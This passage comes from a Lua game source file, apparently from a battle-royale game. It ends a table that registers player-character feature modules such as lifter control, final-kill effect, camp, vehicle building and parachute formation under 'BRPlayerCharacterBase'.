    { LifterControl = "GameLua.Mod.BaseMod.Gameplay.Feature.Player.CharacterLifterControlFeature" },
    { FinalKillEffect = "GameLua.Mod.BaseMod.Gameplay.Feature.Player.PlayerCharacterFinalKillEffectFeature" },
    { CampFeature = "GameLua.Mod.BaseMod.GamePlay.Feature.Camp.PlayerCharacterCampFeature" },
    { BuildSkateFeature = "GameLua.Mod.BaseMod.Gameplay.Feature.PlayerCharacterBuildVehicleFeature" },
    { CommonBornlandTransformFeature = "GameLua.Mod.BaseMod.GamePlay.Feature.HeroPropFeature.CommonBornlandTransformFeature" },
    { ParachuteFormation = "GameLua.Mod.BaseMod.GamePlay.Feature.ParachuteFormationFeature" }
}, "BRPlayerCharacterBase")
